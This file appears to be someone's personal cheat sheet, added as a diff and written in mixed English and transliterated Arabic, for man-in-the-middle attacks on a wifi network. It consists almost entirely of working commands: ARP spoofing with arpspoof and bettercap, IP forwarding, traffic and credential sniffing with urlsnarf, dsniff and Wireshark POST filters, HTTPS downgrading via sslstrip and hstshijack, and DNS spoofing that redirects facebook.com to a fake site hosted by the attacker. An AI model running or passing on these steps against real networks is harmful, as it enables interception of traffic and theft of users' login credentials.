@@ -1,0 +1,57 @@
+arp -a (arp table)
+split terminal
+arpspoof -i wlan0 -t [target ip] [router ip](first terminal)(eza zedet -r ma b3oz a3mil tene terminal huwe bya3mil reverse)
+arpspoof -i wlan0 -t [router ip] [target ip](second terminal)
+cat /proc/sys/net/ipv4/ip_forward
+echo 1 > /proc/sys/net/ipv4/ip_forward(to allow packages to yomr2o)
+urlsnarf - i wlan0
+driftnet -i wlan0 -w
+dsniff -i wlan0(to see credentials but doesnot work) 
+sslstrip(downgrade from https to http)
+------------------------------------------------------------
+wireshark
+http.request.method==POST(filter for login pages)
+double click on the request
+HTML form url encoded befta7a bikono l credentials bi alba
+ettercap -G(-G graphical user interface)
+-------------------------------------------------------------
+bettercap -iface wlan0
+net.probe on (la shuf min ma3e 3al shabake)
+net.show (betrateble yehun bi table)
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.1(target ip)
+arp.spoof on (arp spoof is on)
+net.sniff on (sniff is on w betfarjine 3ashu 3am yfut l victim)
+caplets.show (show caplpets plugins)
+hstshijack (downgrade from https to http)
+-------------------------------------------------------------
+dns poising
+cd /var/www/html
+service apache2 start
+create a file which is website mzawwar
+bettercap -iface wlan0
+net.probe on (la shuf min ma3e 3al shabake)
+net.show (betrateble yehun bi table)
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.1(target ip)
+help dns.spoof
+set dns.spoof.address 10.0.0.3 (my ip)
+set dns.spoof.domains facebook.com,www.facebook.com,*facebook.com(shu makatab l user men haw zaweron)
+arp.spoof on
+dns.spoof on
+net.sniff on
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
